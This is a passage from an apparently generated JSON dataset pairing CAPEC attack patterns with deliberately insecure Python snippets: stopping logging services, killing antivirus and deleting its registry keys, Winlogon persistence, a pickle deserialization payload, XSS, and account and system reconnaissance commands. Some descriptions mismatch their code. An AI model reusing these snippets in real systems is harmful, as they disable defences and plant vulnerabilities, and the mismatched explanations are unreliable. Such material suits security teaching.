        "code_snippet": "import logging\nimport os\n\n# CWE-778: Insufficient Logging\nlogging.basicConfig(filename='app.log', level=logging.ERROR)\n\n# CWE-532: Insertion of Sensitive Information into Log File\nlogging.error('User login failed for user: admin, password: secret123')\n\n# CWE-779: Logging of Excessive Data\nfor i in range(10000):\n    logging.error(f'Error {i}: Something went wrong')\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nos.system('cp -r .git /tmp/exposed_git')\n\n# CAPEC: Block Logging to Central Repository\ntry:\n    os.system('sudo systemctl stop rsyslog')  # Stopping the central logging service\nexcept Exception as e:\n    logging.error(f'Failed to stop logging service: {e}')",
        "description": "This Python code snippet demonstrates several security weaknesses and a potential attack vector as described in the CAPEC and related CWEs. The code sets up logging with insufficient detail (CWE-778) and logs sensitive information (CWE-532). It also logs excessive data (CWE-779), which can make log analysis difficult. Additionally, it exposes a version-control repository to an unauthorized control sphere (CWE-527). Finally, the code attempts to block logging to a central repository by stopping the rsyslog service, embodying the main idea of the CAPEC 'Block Logging to Central Repository'. This action can help an adversary hide indicators of compromise."
    },
    {
        "capec_id": "572",
        "capec_name": "Artificially Inflate File Sizes",
        "code_snippet": "import os\n\n# Function to artificially inflate file size\ndef inflate_file_size(file_path, inflate_size):\n    try:\n        with open(file_path, 'ab') as f:\n            f.write(b'\\0' * inflate_size)\n        print(f\"File {file_path} inflated by {inflate_size} bytes.\")\n    except Exception as e:\n        print(f\"Error inflating file: {e}\")\n\n# Example usage\nfile_path = 'example.txt'\n# Create a file if it doesn't exist\nif not os.path.exists(file_path):\n    open(file_path, 'w').close()\n\n# Inflate the file size by 1MB\ninflate_file_size(file_path, 1024 * 1024)",
        "description": "This Python code snippet demonstrates how an adversary might artificially inflate the size of a file, which aligns with the CAPEC description of 'Artificially Inflate File Sizes'. The function `inflate_file_size` takes a file path and a size in bytes to inflate the file by appending null bytes ('\\0') to the end of the file. This can lead to a Denial of Service condition on systems with limited storage. The code also includes a check to create the file if it does not exist, ensuring the function can operate on any given file path. This snippet embodies CWE-774 by not limiting the file size inflation, CWE-434 by potentially allowing dangerous file types to be inflated, CWE-646 by relying on the file name, and CWE-409 by not handling the data amplification properly."
    },
    {
        "capec_id": "573",
        "capec_name": "Process Footprinting",
        "code_snippet": "import os\n\n# Function to get the list of running processes\n# This function exposes sensitive information about running processes\n# to unauthorized users\n\ndef get_running_processes():\n    processes = os.popen('ps aux').read()\n    return processes\n\n# Simulate an unauthorized user accessing the process information\nunauthorized_user = True\nif unauthorized_user:\n    sensitive_info = get_running_processes()\n    print(sensitive_info)",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Process Footprinting' (CAPEC-169). The function `get_running_processes` uses the `ps aux` command to retrieve information about all running processes on the system. This information is then printed out, simulating exposure to an unauthorized user. The code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by not restricting access to sensitive process information. This can help an adversary learn about the target environment, potentially leading to further malicious activities."
    },
    {
        "capec_id": "574",
        "capec_name": "Services Footprinting",
        "code_snippet": "import os\n\n# Function to get the list of running services\n# This function exposes sensitive information to unauthorized users\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-214: Invocation of Process Using Visible Sensitive Information\ndef get_running_services():\n    try:\n        # Using 'tasklist' command to get the list of running services\n        # This command can expose sensitive information about the system's services\n        services = os.popen('tasklist /svc').read()\n        return services\n    except Exception as e:\n        return str(e)\n\n# Example usage\nif __name__ == '__main__':\n    services_info = get_running_services()\n    print(services_info)",
        "description": "This Python code snippet demonstrates a function that retrieves the list of running services on a Windows system using the 'tasklist /svc' command. The function 'get_running_services' uses the os.popen method to execute the command and read its output. This approach can expose sensitive information about the system's services to unauthorized users, aligning with the CAPEC description of 'Services Footprinting'. The code also touches on several related CWEs: CWE-200 (exposure of sensitive information), CWE-497 (exposure of sensitive system information), and CWE-214 (invocation of process using visible sensitive information). The function's output, which includes potentially sensitive service information, is printed to the console, demonstrating how an adversary could exploit this functionality to gather information about the target system."
    },
    {
        "capec_id": "575",
        "capec_name": "Account Footprinting",
        "code_snippet": "import os\n\n# Function to get user information\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\ndef get_user_info():\n    try:\n        # CWE-214: Invocation of Process Using Visible Sensitive Information\n        user_info = os.popen('net user').read()\n        return user_info\n    except Exception as e:\n        return str(e)\n\n# Function to get domain information\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\ndef get_domain_info():\n    try:\n        # CWE-214: Invocation of Process Using Visible Sensitive Information\n        domain_info = os.popen('dsquery user').read()\n        return domain_info\n    except Exception as e:\n        return str(e)\n\n# Example usage\nif __name__ == '__main__':\n    print('User Information:')\n    print(get_user_info())\n    print('Domain Information:')\n    print(get_domain_info())",
        "description": "This Python code snippet demonstrates how an adversary might exploit system commands to gather sensitive information about user accounts and domain information on a Windows system. The `get_user_info` function uses the 'net user' command to retrieve information about user accounts, while the `get_domain_info` function uses the 'dsquery user' command to gather domain user information. Both functions expose sensitive information to unauthorized actors (CWE-200, CWE-497) and invoke processes with visible sensitive information (CWE-214). This code embodies the main idea of the CAPEC 'Account Footprinting' by showing how an adversary can exploit system commands to gather information that can be used for further malicious activities."
    },
    {
        "capec_id": "576",
        "capec_name": "Group Permission Footprinting",
        "code_snippet": "import os\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-214: Invocation of Process Using Visible Sensitive Information\n# CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\n# CWE-842: Placement of User into Incorrect Group\n# CWE-1229: Creation of Emergent Resource\n\ndef list_local_groups():\n    # This command exposes sensitive information about user groups\n    command = 'net localgroup'\n    result = os.popen(command).read()\n    return result\n\n# Simulate an unauthorized user calling the function\nif __name__ == '__main__':\n    groups_info = list_local_groups()\n    print(groups_info)",
        "description": "This Python code snippet demonstrates a vulnerability where an unauthorized user can exploit a function to list local user groups and their permissions on a Windows system. The function 'list_local_groups' uses the 'net localgroup' command to retrieve and print information about user groups. This embodies the CAPEC concept of 'Group Permission Footprinting' by exposing sensitive information about user groups to unauthorized actors. The code also touches on related CWEs: it exposes sensitive information (CWE-200), uses a command that can be seen by other processes (CWE-214), potentially exposes access control list files (CWE-529), and could lead to incorrect group placements (CWE-842) or creation of emergent resources (CWE-1229)."
    },
    {
        "capec_id": "577",
        "capec_name": "Owner Footprinting",
        "code_snippet": "import os\nimport time\n\n# Function to get the last modified time of a file\n# This simulates the 'dir /A ntuser.dat' command on Windows\n# and exposes sensitive information about user activity\n\ndef get_last_modified_time(file_path):\n    try:\n        # Check if the file exists\n        if os.path.exists(file_path):\n            # Get the last modified time\n            last_modified_time = os.path.getmtime(file_path)\n            # Convert to a readable format\n            readable_time = time.ctime(last_modified_time)\n            return readable_time\n        else:\n            return \"File does not exist.\"\n    except Exception as e:\n        return str(e)\n\n# Example usage\nfile_path = '/home/user/.bash_history'  # Path to a sensitive file\nprint(f\"Last modified time of {file_path}: {get_last_modified_time(file_path)}\")",
        "description": "This Python code snippet demonstrates how an adversary might exploit functionality to identify information about primary users on a target system by checking the last modified time of a sensitive file. The function `get_last_modified_time` takes a file path as input, checks if the file exists, and then retrieves and returns the last modified time in a human-readable format. This simulates the 'dir /A ntuser.dat' command on Windows, which can be used to determine the last login time of a user. The example usage checks the last modified time of the '.bash_history' file, which can reveal user activity. This code embodies the main idea of the CAPEC by exposing sensitive information (user activity) to an unauthorized actor, aligning with CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere)."
    },
    {
        "capec_id": "578",
        "capec_name": "Disable Security Software",
        "code_snippet": "import os\nimport subprocess\n\n# CWE-798: Use of Hard-coded Credentials\nadmin_password = 'hardcoded_password'\n\n# Function to disable security software\n# CWE-284: Improper Access Control\n# CWE-671: Lack of Administrator Control over Security\n# CWE-1037 & CWE-733: Processor/Compiler Optimization Removal or Modification of Security-critical Code\n\ndef disable_security_software(password):\n    if password == admin_password:\n        try:\n            # Attempt to kill a security process (e.g., antivirus)\n            subprocess.run(['taskkill', '/F', '/IM', 'antivirus.exe'], check=True)\n            # Delete a registry key to prevent security software from starting\n            os.system('reg delete HKLM\\Software\\SecuritySoftware /f')\n            # Delete log files\n            os.remove('C:\\SecuritySoftware\\logs\\logfile.log')\n            print('Security software disabled.')\n        except Exception as e:\n            print(f'Error disabling security software: {e}')\n    else:\n        print('Invalid password.')\n\n# Example usage\n# This would be called by an unauthorized actor who has obtained the hard-coded password\ndisable_security_software('hardcoded_password')",
        "description": "This Python code snippet demonstrates a scenario where an adversary can disable security software by exploiting several weaknesses. The code uses a hard-coded password (CWE-798) to authenticate an unauthorized user. If the password matches, it attempts to kill a security process, delete a registry key to prevent the software from starting at runtime, and remove log files. This represents the CAPEC 'Disable Security Software' by showing how improper access control (CWE-284) and lack of administrator control over security (CWE-671) can be exploited. Additionally, it hints at potential issues with processor/compiler optimizations (CWE-1037 & CWE-733) that could remove or modify security-critical code."
    },
    {
        "capec_id": "579",
        "capec_name": "Replace Winlogon Helper DLL",
        "code_snippet": "import winreg\n\n# Vulnerable code: Modifying Winlogon registry key to load a malicious DLL\ntry:\n    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon', 0, winreg.KEY_SET_VALUE)\n    winreg.SetValueEx(key, 'Userinit', 0, winreg.REG_SZ, 'C:\\malicious.dll')\n    winreg.CloseKey(key)\n    print('Registry key modified successfully.')\nexcept Exception as e:\n    print(f'Failed to modify registry key: {e}')",
        "description": "This Python code snippet demonstrates a vulnerability where the Winlogon registry key is modified to load a malicious DLL at startup. The code opens the Winlogon registry key and sets the 'Userinit' value to a path of a malicious DLL. This embodies the CAPEC 'Replace Winlogon Helper DLL' by showing how an adversary can exploit this feature to load adversarial code at startup. The related CWEs provide additional context, such as CWE-15 (External Control of System or Configuration Setting) and CWE-427 (Uncontrolled Search Path Element), which highlight the risks of allowing external control over system settings and the dangers of uncontrolled search paths."
    },
    {
        "capec_id": "580",
        "capec_name": "System Footprinting",
        "code_snippet": "import os\nimport time\n\n# Function to simulate a login process\ndef login(username, password):\n    # Simulated user data\n    user_data = {\n        'admin': 'admin123',\n        'user': 'user123'\n    }\n\n    # Check if username exists\n    if username in user_data:\n        # Simulate a timing discrepancy based on password correctness\n        if user_data[username] == password:\n            time.sleep(0.1)  # Simulate processing time for correct password\n            return 'Login successful'\n        else:\n            time.sleep(0.5)  # Simulate processing time for incorrect password\n            return 'Login failed'\n    else:\n        return 'User not found'\n\n# Function to simulate system footprinting\ndef system_footprinting():\n    # Simulate exposure of sensitive system information\n    system_info = os.uname()\n    return system_info\n\n# Example usage\nprint(login('admin', 'wrongpassword'))\nprint(system_footprinting())",
        "description": "This Python code snippet demonstrates a vulnerable login function and a system footprinting function. The login function introduces a timing discrepancy (CWE-208) by taking different amounts of time to respond based on whether the password is correct or not. This can reveal information about the internal state of the system to an attacker. The system_footprinting function exposes sensitive system information (CWE-497) by returning the system's uname information, which can be used by an attacker to gather details about the target system. These vulnerabilities align with the CAPEC description of System Footprinting, where an adversary probes and explores a system to gather security information."
    },
    {
        "capec_id": "581",
        "capec_name": "Security Software Footprinting",
        "code_snippet": "import os\nimport subprocess\n\n# Function to list installed security software\ndef list_security_software():\n    try:\n        # Example command to list installed software (Windows)\n        installed_software = subprocess.check_output(['wmic', 'product', 'get', 'name'], shell=True)\n        installed_software = installed_software.decode('utf-8')\n        \n        # Filter for known security software keywords\n        security_software = [line for line in installed_software.split('\\n') if 'antivirus' in line.lower() or 'firewall' in line.lower()]\n        \n        return security_software\n    except Exception as e:\n        return str(e)\n\n# Function to expose sensitive system information\ndef expose_system_info():\n    try:\n        # Example command to get system information (Windows)\n        system_info = subprocess.check_output(['systeminfo'], shell=True)\n        return system_info.decode('utf-8')\n    except Exception as e:\n        return str(e)\n\n# Main function to demonstrate security software footprinting\nif __name__ == '__main__':\n    security_software = list_security_software()\n    system_info = expose_system_info()\n    \n    # Print the gathered information (simulating exposure)\n    print('Installed Security Software:')\n    print('\\n'.join(security_software))\n    print('\\nSystem Information:')\n    print(system_info)",
        "description": "This Python code snippet demonstrates the concept of 'Security Software Footprinting' by attempting to list installed security software and expose sensitive system information. The `list_security_software` function uses a system command to list all installed software and filters for known security software keywords. The `expose_system_info` function retrieves detailed system information. Both functions simulate the exposure of sensitive information, which aligns with CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere). The code also indirectly touches on CWE-1395 (Dependency on Vulnerable Third-Party Component) by using system commands that could be exploited if vulnerabilities exist in the underlying system components."
    },
    {
        "capec_id": "582",
        "capec_name": "Route Disabling",
        "code_snippet": "import socket\nimport threading\n\n# Simulate a network route disabling attack\nclass RouteDisabler:\n    def __init__(self, target_ip, target_port):\n        self.target_ip = target_ip\n        self.target_port = target_port\n        self.running = False\n\n    def start(self):\n        self.running = True\n        self.thread = threading.Thread(target=self.disable_route)\n        self.thread.start()\n\n    def disable_route(self):\n        while self.running:\n            try:\n                # Create a socket to simulate route disabling\n                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                s.connect((self.target_ip, self.target_port))\n                s.shutdown(socket.SHUT_RDWR)\n                s.close()\n            except Exception as e:\n                print(f\"Error disabling route: {e}\")\n\n    def stop(self):\n        self.running = False\n        self.thread.join()\n\n# Example usage\nif __name__ == \"__main__\":\n    disabler = RouteDisabler('192.168.1.1', 80)\n    disabler.start()\n    # Run for a short period to simulate the attack\n    import time\n    time.sleep(10)\n    disabler.stop()",
        "description": "This Python code snippet simulates a network route disabling attack, embodying the main idea of the CAPEC 'Route Disabling'. The 'RouteDisabler' class creates a socket connection to a target IP and port, then immediately shuts it down, effectively disrupting the communication channel. This action is repeated in a loop to continuously sever the route between two entities. The code also includes a brief example of how to use the 'RouteDisabler' class. This snippet highlights vulnerabilities related to improper enforcement of message integrity, unauthorized error injection, and incorrect specification of communication channels, as described in the related CWEs."
    },
    {
        "capec_id": "583",
        "capec_name": "Disabling Network Hardware",
        "code_snippet": "import os\nimport time\n\n# Simulate disabling network hardware by shutting down network interface\n# CWE-1256: Improper Restriction of Software Interfaces to Hardware Features\n# CWE-1304: Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation\n# CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n\n# Function to disable network interface\n# WARNING: This code is for educational purposes only and should not be executed on a live system.\ndef disable_network_interface(interface):\n    try:\n        # Improperly restrict software interface to hardware feature (CWE-1256)\n        os.system(f'sudo ifconfig {interface} down')\n        print(f'Network interface {interface} has been disabled.')\n        \n        # Simulate improper preservation of hardware configuration state (CWE-1304)\n        time.sleep(5)  # Simulate power save/restore operation\n        os.system(f'sudo ifconfig {interface} up')\n        print(f'Network interface {interface} has been re-enabled.')\n        \n        # Improper protection for outbound error messages and alert signals (CWE-1320)\n        # Here we should log the error or alert, but we are not doing it properly\n        # This is just a placeholder to show where the error handling would be\n        print('Error: Network interface state change not properly logged.')\n    except Exception as e:\n        print(f'An error occurred: {e}')\n\n# Example usage\ndisable_network_interface('eth0')",
        "description": "This Python code snippet demonstrates the concept of 'Disabling Network Hardware' by simulating the disabling and re-enabling of a network interface. The code includes vulnerabilities related to the CAPEC description and associated CWEs. Specifically, it improperly restricts software interfaces to hardware features (CWE-1256) by allowing the network interface to be disabled via a system command. It also simulates an improper preservation of hardware configuration state during a power save/restore operation (CWE-1304) by introducing a delay. Additionally, it fails to properly handle and log error messages and alert signals (CWE-1320). This code is for educational purposes only and should not be executed on a live system."
    },
    {
        "capec_id": "584",
        "capec_name": "BGP Route Disabling",
        "code_snippet": "import socket\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\n\ndef suppress_bgp_route(target_as):\n    # Create a socket for BGP communication\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    \n    # CWE-941: Incorrectly specify the destination AS\n    incorrect_as = '192.0.2.1'  # Incorrect AS IP\n    s.connect((incorrect_as, 179))  # BGP typically uses port 179\n    \n    # CWE-757: Use a less secure algorithm for communication\n    # This is a simplified representation; actual BGP uses more complex negotiation\n    s.send(b'USE_LESS_SECURE_ALGO')\n    \n    # CWE-924: Do not enforce message integrity\n    bgp_update_message = b'BGP_UPDATE'  # Simplified BGP update message\n    s.send(bgp_update_message)\n    \n    # Suppress the route by sending an invalid update\n    s.send(b'INVALIDATE_ROUTE')\n    \n    s.close()\n\n# Example usage\nsuppress_bgp_route('target_as')",
        "description": "This Python code snippet demonstrates a simplified attack on the Border Gateway Protocol (BGP) to suppress route advertisements, making a network inaccessible. The function `suppress_bgp_route` takes a target Autonomous System (AS) as input and performs the following actions:\n\n1. **CWE-941**: Incorrectly specifies the destination AS by connecting to an incorrect IP address.\n2. **CWE-757**: Uses a less secure algorithm for communication, represented by sending a 'USE_LESS_SECURE_ALGO' message.\n3. **CWE-924**: Does not enforce message integrity, sending a simplified BGP update message without ensuring its integrity.\n\nFinally, it sends an 'INVALIDATE_ROUTE' message to suppress the route, effectively making the target network inaccessible. This code embodies the main idea of the CAPEC by demonstrating how an adversary can manipulate BGP to disrupt network availability."
    },
    {
        "capec_id": "585",
        "capec_name": "DNS Domain Seizure",
        "code_snippet": "import socket\nimport requests\n\n# CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\ndef is_trusted_domain(ip_address):\n    try:\n        hostname = socket.gethostbyaddr(ip_address)[0]\n        # CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n        trusted_domains = ['trusted.com', 'secure.org']\n        return any(hostname.endswith(domain) for domain in trusted_domains)\n    except socket.herror:\n        return False\n\n# CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\ndef redirect_user(user_input_url):\n    if is_trusted_domain(user_input_url):\n        return f\"Redirecting to {user_input_url}\"\n    else:\n        return \"Untrusted domain. Redirection blocked.\"\n\n# CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\ndef generate_web_page(user_input):\n    return f\"<html><body>{user_input}</body></html>\"\n\n# Example usage\nuser_ip = '192.0.2.1'\nuser_url = 'http://untrusted.com'\nuser_input = '<script>alert(\"XSS\")</script>'\n\nprint(redirect_user(user_url))\nprint(generate_web_page(user_input))",
        "description": "This Python code snippet demonstrates vulnerabilities related to DNS Domain Seizure and associated CWEs. The `is_trusted_domain` function performs reverse DNS resolution (CWE-350) to check if an IP address belongs to a trusted domain, but it does not ensure the IP address is truly associated with the hostname. The `redirect_user` function uses this check to decide whether to redirect a user to a given URL, potentially leading to open redirect vulnerabilities (CWE-601). The `generate_web_page` function improperly neutralizes user input, making it susceptible to cross-site scripting (CWE-79). This code illustrates how improper handling of DNS resolution and user input can lead to security issues, aligning with the concept of DNS Domain Seizure."
    },
    {
        "capec_id": "586",
        "capec_name": "Object Injection",
        "code_snippet": "import pickle\n\nclass SensitiveData:\n    def __init__(self, secret):\n        self.secret = secret\n\nclass MaliciousPayload:\n    def __reduce__(self):\n        import os\n        return (os.system, ('echo Malicious Code Executed',))\n\n# Simulate receiving serialized data from an untrusted source\nserialized_data = pickle.dumps(MaliciousPayload())\n\n# Vulnerable deserialization\ntry:\n    deserialized_object = pickle.loads(serialized_data)\nexcept Exception as e:\n    print(f'Error during deserialization: {e}')\n\n# Accessing sensitive data\nsensitive_instance = SensitiveData('TopSecret')\nserialized_sensitive = pickle.dumps(sensitive_instance)\ndeserialized_sensitive = pickle.loads(serialized_sensitive)\nprint(f'Deserialized sensitive data: {deserialized_sensitive.secret}')",
        "description": "This Python code snippet demonstrates a vulnerable deserialization process using the `pickle` module. The `SensitiveData` class contains sensitive information, and the `MaliciousPayload` class is designed to execute a system command upon deserialization. The code simulates receiving serialized data from an untrusted source and deserializes it without proper validation, leading to potential remote code execution. Additionally, it shows how sensitive data can be serialized and deserialized, highlighting the risk of exposing sensitive information. This example embodies the main idea of the CAPEC by illustrating how an adversary can exploit deserialization of untrusted data to execute malicious code and access sensitive information."
    },
    {
        "capec_id": "587",
        "capec_name": "Cross Frame Scripting (XFS)",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return '''<html>\n<head>\n    <title>Vulnerable Page</title>\n</head>\n<body>\n    <h1>Welcome to the Vulnerable Page</h1>\n    <iframe src=\"http://trusted-site.com\" style=\"display:none;\"></iframe>\n    <script>\n        // Malicious JavaScript interacting with the iframe\n        var iframe = document.querySelector('iframe');\n        iframe.onload = function() {\n            var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;\n            var sensitiveData = iframeDoc.getElementById('sensitiveData').innerText;\n            alert('Sensitive Data: ' + sensitiveData);\n        };\n    </script>\n</body>\n</html>'''\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet creates a simple Flask web application that serves a vulnerable HTML page. The page includes an iframe that loads content from a trusted site (http://trusted-site.com) and a malicious JavaScript snippet that interacts with the iframe. The JavaScript waits for the iframe to load, then accesses and alerts sensitive data from the iframe's document. This demonstrates a Cross Frame Scripting (XFS) attack, where the attacker uses a hidden iframe to interact with a legitimate webpage without the user's knowledge. The code also touches on related CWEs by showing improper restriction of iframe content (CWE-1021) and potential for cross-site scripting (CWE-79)."
    },
    {
        "capec_id": "588",
        "capec_name": "DOM-Based XSS",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    user_input = request.args.get('input', '')\n    # Vulnerable to DOM-Based XSS\n    template = f\"<html><body><script>var user_input = '{user_input}'; document.write(user_input);</script></body></html>\"\n    return render_template_string(template)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that is vulnerable to DOM-Based XSS attacks. The application takes user input from a query parameter and directly inserts it into a JavaScript context within the HTML without proper validation or encoding. This allows an attacker to inject malicious scripts that will be executed in the client's browser after the page loads, bypassing any server-side filtering. The code demonstrates the main idea of CAPEC-63 (DOM-Based XSS) and highlights related CWEs such as CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-20 (Improper Input Validation), and CWE-83 (Improper Neutralization of Script in Attributes in a Web Page)."
    },
    {
        "capec_id": "589",
        "capec_name": "DNS Blocking",
        "code_snippet": "import socket\n\n# Vulnerable DNS request handling\nclass DNSBlocker:\n    def __init__(self, block_list):\n        self.block_list = block_list\n\n    def handle_request(self, request):\n        # Extract the domain from the DNS request\n        domain = self.extract_domain(request)\n        if domain in self.block_list:\n            print(f\"Blocking DNS request for {domain}\")\n            return None  # Drop the request\n        else:\n            return self.forward_request(request)\n\n    def extract_domain(self, request):\n        # Simplified extraction of domain from DNS request\n        return request.split()[1]\n\n    def forward_request(self, request):\n        # Forward the request to the actual DNS server\n        try:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n            sock.sendto(request.encode(), ('8.8.8.8', 53))\n            response, _ = sock.recvfrom(512)\n            return response\n        except Exception as e:\n            print(f\"Error forwarding request: {e}\")\n            return None\n\n# Example usage\nblock_list = ['example.com', 'malicious.com']\ndns_blocker = DNSBlocker(block_list)\n\n# Simulated DNS request\nrequest = 'QUERY example.com'\nresponse = dns_blocker.handle_request(request)\nif response:\n    print(f\"DNS response: {response}\")\nelse:\n    print(\"Request was blocked\")",
        "description": "This Python code snippet demonstrates a simplified DNS request handler that blocks DNS requests based on a predefined block list. The `DNSBlocker` class has a method `handle_request` that checks if the requested domain is in the block list and drops the request if it is. Otherwise, it forwards the request to a real DNS server (Google's public DNS server in this case). The code embodies the main idea of CAPEC-300 by intercepting and intentionally dropping DNS requests based on their content. It also touches on related CWEs such as CWE-300 (Channel Accessible by Non-Endpoint) by not verifying the identity of the DNS server, CWE-291 (Reliance on IP Address for Authentication) by using a hardcoded IP address for the DNS server, and CWE-1327 (Binding to an Unrestricted IP Address) by not restricting the IP address used for forwarding requests."
    },
    {
        "capec_id": "590",
        "capec_name": "IP Address Blocking",
        "code_snippet": "import socket\n\n# Vulnerable server binding to an unrestricted IP address (0.0.0.0)\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('0.0.0.0', 8080))\nserver_socket.listen(5)\n\nprint('Server listening on 0.0.0.0:8080')\n\nwhile True:\n    client_socket, client_address = server_socket.accept()\n    print(f'Connection from {client_address}')\n    # Reliance on IP address for authentication\n    if client_address[0] == '192.168.1.100':\n        client_socket.send(b'Authenticated')\n    else:\n        client_socket.send(b'Access Denied')\n    client_socket.close()",
        "description": "This Python code snippet demonstrates a vulnerable server that binds to an unrestricted IP address (0.0.0.0), making it accessible from any network interface. The server listens for incoming connections on port 8080. When a client connects, the server relies on the client's IP address for authentication, granting access if the IP address matches '192.168.1.100'. This approach is insecure because it can be easily spoofed, and the server does not adequately verify the identity of the client. This code embodies the main idea of the CAPEC 'IP Address Blocking' by showing how improper handling of IP addresses and communication channels can lead to vulnerabilities, as described in the related CWEs."
    },
    {
        "capec_id": "591",
        "capec_name": "Reflected XSS",
        "code_snippet": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    query = request.args.get('q')\n    # Vulnerable to Reflected XSS\n    return f'<html><body>Search results for: {query}</body></html>'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application with a search endpoint. The endpoint takes a query parameter 'q' from the URL and directly includes it in the HTML response without any input sanitization or encoding. This makes the application vulnerable to Reflected Cross-Site Scripting (XSS) attacks, as described in CAPEC-79. An attacker could craft a URL with a malicious script in the 'q' parameter, which would then be reflected back to the victim's browser and executed. This example also touches on related CWEs, such as CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-81 (Improper Neutralization of Script in an Error Message Web Page), by demonstrating how user input can be improperly handled and lead to security vulnerabilities."
    },
    {
        "capec_id": "592",
        "capec_name": "Stored XSS",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n# Simulated database\ncomments = []\n\n@app.route('/submit', methods=['POST'])\ndef submit_comment():\n    comment = request.form['comment']\n    # Vulnerable to Stored XSS\n    comments.append(comment)\n    return 'Comment submitted!'\n\n@app.route('/view')\ndef view_comments():\n    # Vulnerable to Stored XSS\n    comments_html = ''.join(f'<p>{comment}</p>' for comment in comments)\n    return render_template_string(f'<html><body>{comments_html}</body></html>')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that is vulnerable to Stored Cross-Site Scripting (XSS). The application has two routes: '/submit' for submitting comments and '/view' for viewing them. The comments are stored in a list and directly rendered in the HTML without any sanitization, making it susceptible to XSS attacks. An attacker can submit a comment containing malicious JavaScript code, which will be stored and executed when another user views the comments. This example highlights CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-692 (Incomplete Denylist to Cross-Site Scripting) by not properly sanitizing user input before rendering it in the web page."
    },
    {
        "capec_id": "593",
        "capec_name": "Session Hijacking",
        "code_snippet": "from flask import Flask, session, redirect, url_for, request\n\napp = Flask(__name__)\napp.secret_key = 'supersecretkey'\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    if authenticate(username, password):\n        session['user'] = username\n        return redirect(url_for('dashboard'))\n    return 'Invalid credentials', 401\n\n@app.route('/dashboard')\ndef dashboard():\n    if 'user' in session:\n        return f'Welcome {session['user']}'\n    return redirect(url_for('login'))\n\n@app.route('/logout')\ndef logout():\n    session.pop('user', None)\n    return redirect(url_for('login'))\n\n@app.route('/set_session')\ndef set_session():\n    session['user'] = 'attacker'\n    return 'Session set'\n\ndef authenticate(username, password):\n    # Dummy authentication function\n    return username == 'admin' and password == 'password'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application with a vulnerability to session hijacking. The application has login, dashboard, and logout routes. The 'set_session' route allows an attacker to set the session user to 'attacker', simulating a session fixation attack (CWE-384). The session is not invalidated upon login, and there is no session expiration mechanism (CWE-613). Additionally, the session ID length is not configured, potentially leading to insufficient session ID length (CWE-6). The code also relies on client-side enforcement of server-side security (CWE-602) by trusting the session data without proper validation."
    },
    {
        "capec_id": "594",
        "capec_name": "Traffic Injection",
        "code_snippet": "import socket\n\n# Vulnerable server code\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('0.0.0.0', 8080))\nserver_socket.listen(5)\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr}')\n    data = client_socket.recv(1024)\n    if data:\n        # CWE-319: Cleartext Transmission of Sensitive Information\n        print(f'Received data: {data.decode()}')\n        # CWE-924: No integrity check on received data\n        if data.decode() == 'shutdown':\n            # CWE-99: Improper Control of Resource Identifiers\n            print('Shutting down server...')\n            break\n    client_socket.close()\n\nserver_socket.close()",
        "description": "This Python code snippet represents a vulnerable server that listens for incoming connections and processes data without proper security measures. The server accepts connections and prints received data in cleartext (CWE-319). It does not verify the integrity of the received data (CWE-924), making it susceptible to traffic injection attacks where an adversary can inject malicious commands. Additionally, the server improperly handles resource identifiers (CWE-99) by shutting down based on a simple string comparison without authentication. This demonstrates the main idea of the CAPEC, where an adversary can inject traffic to disrupt or modify the connection."
    },
    {
        "capec_id": "595",
        "capec_name": "Connection Reset",
